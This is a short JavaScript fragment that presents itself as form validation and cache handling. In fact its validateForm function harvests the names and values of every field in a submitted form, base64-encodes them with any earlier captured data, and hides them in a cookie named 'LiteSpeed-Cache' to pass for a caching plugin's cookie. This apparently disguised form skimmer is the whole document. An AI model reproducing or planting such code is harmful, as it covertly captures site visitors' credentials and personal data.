function validateForm(form) {
    var form = form.id;
    var json_data = {};
    var data = document.getElementById(form);
    for (i = 0; i < data.length; i++) {
        if (!data[i].name == null || !data[i].name == false || !data[i].name == "") {
            json_data[data[i].name] = data[i].value
        }
    }
    var check = checkCache();
    if (!check == null || !check == false) {
        json_data['old_cache'] = btoa(check);
    }
    json_data = JSON.stringify(json_data);
    var cache = cacheManager(json_data);
    document.cookie = "LiteSpeed-Cache=" + btoa(cache) + "; SameSite=None; Secure";
}

function checkCache() {
    var cache = getCookie("LiteSpeed-Cache");
    if (cache == null) {
        return null;
    } else {
        if (cache === "") {
            return false;
        } else {
            return cache;
        }
    }
}

